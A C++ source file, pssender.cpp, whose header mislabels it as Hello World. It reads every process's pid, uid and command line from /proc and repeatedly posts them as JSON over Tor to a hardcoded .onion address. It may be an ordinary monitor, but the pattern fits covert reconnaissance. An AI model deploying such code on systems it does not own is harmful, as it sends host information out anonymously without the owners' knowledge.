//============================================================================
// Name        : pssender.cpp
// Author      : D.Meytis
// Version     :
// Copyright   : 
// Description : Hello World in C++, Ansi-style
//============================================================================

#include <iostream>
#include <fstream>
#include <cerrno>
#include <csignal>
#include <cstring>
#include <cstdio>
#include <unistd.h>
#include <dirent.h>
#include <curl/curl.h>

#include "json.hpp"
#include "fifo_map.hpp"

using namespace std;

#define MAXLINE 512

template<class K, class V, class dummy_compare, class A>
using my_workaround_fifo_map = nlohmann::fifo_map<K, V, nlohmann::fifo_map_compare<K>, A>;
using my_json = nlohmann::basic_json<my_workaround_fifo_map>;

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp) {
   return size * nmemb;
}

my_json procps_parse() {
	DIR *proc = opendir("/proc");
	my_json j;
	for (;;) {
		unsigned pid, uid;
		string fil, cmd, buffer;
		fstream fs;
		bool kernel;

		struct dirent *entry = readdir(proc);
		if (entry == NULL)
			break;

		pid = strtoul(entry->d_name, NULL, 0);
		if (!pid)
			continue;

		fil = "/proc/" + to_string(pid) + "/cmdline";
		fs.open(fil.c_str(), fstream::in);
		if (!fs.is_open())
			perror("error while opening file");
		fs >> cmd;
		kernel = cmd.empty();
		fs.close();

		fil = "/proc/" + to_string(pid) + "/status";
		fs.open(fil.c_str(), fstream::in);
		if (!fs.is_open())
			perror("error while opening file");
		while (getline(fs, buffer)) {
			if (kernel)
				if (buffer.find("Name:") != string::npos)
					cmd = buffer.substr(6);
			if (buffer.find("Uid:") != string::npos) {
				uid = stoi(buffer.substr(4));
				break;
			}
		}
		fs.close();

		/* find and screen special JSON symbols in cmd */
		size_t found = cmd.find_first_of("\"\\");
		while (found != string::npos) {
			cmd.insert(found, 1, '\\');
			found = cmd.find_first_of("\"\\", found + 1);
		}

		j += {{"uid", uid}, {"pid", pid}, {"cmd", cmd.data()}};
	}
	closedir(proc);
	return j;
}

int main(int argc, char** argv) {
	if (argc != 2) {
		cout << "Usage: pssender N [N - interval between messages]" << endl;
		return EINVAL;
	}
	long int sleepval = strtol(argv[1], NULL, 0);

	CURL *curl;
	CURLcode res;
	curl = curl_easy_init();
	if (curl == nullptr) {
		cerr << "curl_easy_init() error";
		return -1;
	}

	curl_easy_setopt(curl, CURLOPT_URL, "http://uek4lvwoyyoosvlq.onion/stats");
	curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5_HOSTNAME);
	curl_easy_setopt(curl, CURLOPT_PROXY, "127.0.0.1:9050");
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); /* dummy func to ignore POST response */


	for (;;) {
		my_json j = procps_parse();
		string js = j.dump();
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, js.data());

		do {
			res = curl_easy_perform(curl);
			if (res == CURLE_OK)
				cout << "Processes list successfully sent" << endl;
			else
				cerr << "Sending error: " << curl_easy_strerror(res) << endl;
		} while (res != CURLE_OK);

		sleep(sleepval);
	}
	curl_easy_cleanup(curl);
	return 0;
}
